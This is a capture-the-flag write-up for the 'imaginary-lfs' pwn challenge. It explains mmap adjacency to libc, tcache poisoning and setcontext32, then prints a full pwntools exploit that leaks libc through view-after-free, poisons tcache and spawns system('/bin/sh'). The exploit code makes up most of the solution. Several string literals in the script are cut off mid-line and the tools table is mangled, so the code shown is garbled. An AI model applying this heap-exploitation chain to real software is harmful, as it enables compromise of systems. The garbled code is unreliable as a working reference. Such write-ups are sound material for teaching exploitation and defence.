# imaginary-lfs — ImaginaryCTF Writeup

**Challenge:** imaginary-lfs  
**Category:** Pwn  
**Difficulty:** Hard  
**Points:** 100 pts  
**Flag:** `ictf{5h0uldv3_5p3n7_m0r3_mun3y_0n_53cur17y_30b966da}`

---

## Description

> ImaginaryCTF is introducing our brand new Storage-as-a-Service system, imaginary-lfs.

**Connection:** `nc eth007.me 42190`

---

## Background Knowledge (Read This First!)

### What is mmap?

**mmap** allocates memory by mapping pages directly from the OS instead of using the normal heap. It is used for large allocations. The key property: mmap chunks are placed adjacent to libc in memory.

### What is tcache poisoning?

**tcache** is a fast per-thread cache for freed heap chunks. **Tcache poisoning** overwrites the `next` pointer of a freed chunk with a fake address. The next allocation from that size class returns your fake address — giving you a write-anywhere primitive.

### What is setcontext32?

**setcontext32** is a technique that uses the `setcontext` function in libc to pivot the stack and execute shellcode (like `system("/bin/sh")`) without a traditional ROP chain.

### What is the attack flow?

1. Create mmap chunks — they sit adjacent to libc
2. Fake tcache chunk headers inside the tag field
3. Free chunks → use view-after-free to leak encrypted pointers
4. Decrypt pointer → compute libc base address
5. Tcache poison with overflow during creation → allocate at target
6. Use secret metadata option (1337) to write payload
7. Call `system("/bin/sh")` via setcontext32

---

## Solution

### Step 1 — Download the binary and libc

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ wget <attachment url>
└─$ ls
lfs  libc.so.6
```

### Step 2 — Create the exploit script

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ nano exploit.py
```

Paste this:

```python
from pwn import *
from setcontext32 import setcontext32

r = process('./lfs')
libc = ELF('./libc.so.6')
i = 0

def create(sz, data, tag):
    global i
    r.recvuntil(b'>')
    r.sendline(b'1')
    r.recvuntil(b'>')
    r.sendline(str(sz).encode())
    r.recvuntil(b'>')
    r.sendline(data)
    r.recvuntil(b'>')
    r.sendline(tag.ljust(64, b'
    i += 1
    return i - 1

def delete(i):
    r.recvuntil(b'>')
    r.sendline(b'2')
    r.recvuntil(b'>')
    r.sendline(str(i).encode())

def export(i):
    r.recvuntil(b'>')
    r.sendline(b'3')
    r.recvuntil(b'>')
    r.sendline(str(i).encode())
    r.recvuntil(b'---'); r.recvuntil(b'---
')
    contents = r.recvuntil(b'---', drop=True)
    r.recvuntil(b'---
')
    return contents

def metadata(i, data, sz):
    r.recvuntil(b'>')
    r.sendline(b'1337')
    r.recvuntil(b'>')
    r.sendline(str(i).encode())
    r.recvuntil(b'>')
    r.sendline(str(sz).encode())
    r.recvuntil(b'>')
    r.sendline(data)

# Create 3 large mmap chunks — adjacent to libc
a = create(0x23000-0x18, b'a', b'a')
b = create(0x23000-0x18, b'b', b'a'*0x10+p64(0x410|0x1))
c = create(0x23000-0x18, b'c', b'a'*0x10+p64(0x410|0x1))

# Free and leak encrypted pointer via view-after-free
delete(a)
delete(b)
encrypted = u64(export(a)[:8])

# Compute libc base from mmap adjacency
libc.address = (encrypted << 12) + 0x26000
b_key = encrypted - 0x23

# Build setcontext32 payload for system("/bin/sh")
delete(c)
dest, payload = setcontext32(
    libc, rip=libc.sym["system"], rdi=libc.search(b"/bin/sh").__next__()
)

# Tcache poison → write payload
c = create(0x24000-0x18, b'c', b'a'*0x10+p64(0x30|0x1)+p64(b_key ^ dest))
metadata(c, b'a'*0x408, 0x408)
metadata(c, payload[:0x408], 0x408)

r.interactive()
# → ictf{5h0uldv3_5p3n7_m0r3_mun3y_0n_53cur17y_30b966da}
Step 3 — Run the exploit
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ python3 exploit.py
# → shell spawned → cat flag.txt
# → ictf{5h0uldv3_5p3n7_m0r3_mun3y_0n_53cur17y_30b966da}

Tools Used
ToolPurposeLevelpwntoolsBuild and send exploit payload⭐⭐⭐ Hardsetcontext32Stack pivot to system("/bin/sh")⭐⭐⭐ HardGDB + pwndbgDebug heap layout and pointer encryption⭐⭐⭐ Hard

Key Takeaways

mmap chunks are placed adjacent to libc — a reliable way to get a libc leak
View-after-free leaks the encrypted tcache pointer → decrypt to get real address
Tcache poisoning with an overflow during chunk creation gives write-anywhere
The secret menu option (1337) is the hidden primitive that enables the final write

